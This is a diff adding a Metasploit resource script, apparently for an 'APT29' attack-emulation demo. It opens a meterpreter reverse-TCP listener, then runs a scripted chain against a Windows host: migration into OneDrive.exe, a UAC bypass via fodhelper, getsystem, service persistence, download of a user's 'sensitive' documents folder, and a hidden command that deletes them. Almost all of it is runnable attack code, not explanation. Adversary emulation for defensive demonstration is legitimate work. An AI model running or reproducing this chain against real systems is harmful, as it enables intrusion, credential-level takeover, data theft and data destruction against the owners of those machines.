@@ -1,0 +1,100 @@
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 10.0.0.7
+set lport 4444
+exploit -j
+
+<ruby>
+
+print_line(" ")
+print_good("**************************************************************************")
+print_good("*                           S1 APT29 Demo                                *")
+print_good("**************************************************************************")
+print_line(" ")
+
+session = framework.sessions[1]
+
+def waitforkey(text)
+  print_line("-------------------------------------------------------------------------------")                                                                                                            
+  print_good(text)
+  print_line("-------------------------------------------------------------------------------")                                                                                                    
+  STDIN.getch                                                                                                                                                                                                                    
+end
+
+def endline()
+  print_line("-------------------------------------------------------------------------------")                                                                                                            
+  print_line(" ")
+  print_line(" ")
+  print_line(" ")                                                                                                                                                                                                                                                                                                                
+end
+
+sleep(3) 
+waitforkey("Establish meterpreter session, then press any key to continue")
+
+print_status("Phase 1 - Process Migration via Process Injection")
+session = framework.sessions[1]
+pid = session.sys.process["OneDrive.exe"]
+pid2 = "migrate" + " " + pid.to_s
+print_line(pid2)
+session.console.run_single(pid2)
+session.console.run_single("background")
+
+print_status("Sleeping 5 seconds")				
+sleep(5)
+endline()
+
+waitforkey("Press any key to Bypass UAC")
+
+print_status("Phase 2 - Privelege Escalation via FODHELPER")
+run_single("use exploit/windows/local/bypassuac_fodhelper")
+run_single("set session 1")
+run_single("exploit -j")
+session = framework.sessions[1]	
+session.console.run_single("background")
+				
+print_status("Sleeping 15 seconds")				
+sleep(15)
+endline()
+
+waitforkey("Press any key to get system level creds and set persistence")
+
+print_status("Phase 3 - Privelege Escalation via Reflection & Persistence via Local Service")
+session = framework.sessions[2]
+session.console.run_single("getsystem")
+session.console.run_single("background")
+sleep(1)
+
+#waitforkey("Press any key to set persistence")
+
+#print_status("Phase 4 - Persistence via Local Service")
+run_single("use exploit/windows/local/persistence_service")
+run_single("set session 2")				
+run_single("exploit -j")
+print_status("Sleeping 10 seconds")
+sleep(10)
+endline()
+
+waitforkey("Press any key to exfil data")
+
+print_status("Phase 4 - Data Exfiltration")
+sleep(5)
+session = framework.sessions[2]
+session.console.run_single("download \"c:\\users\\sentinel\\documents\\sensitive\"")
+endline()
+
+waitforkey("Press any key to delete data")
+
+print_status("Phase 5 - Data Destruction")
+r = session.sys.process.execute("cmd /c del c:\\users\\sentinel\\documents\\sensitive /q", nil, {'Hidden' => true, 'Channelized' => true})
+
+while(d = r.channel.read)
+print_status("t#{d}")
+end
+
+r.channel.close
+r.close
+print_good("Data Destroyed")
+endline()
+
+print_status("All done")
+</ruby>
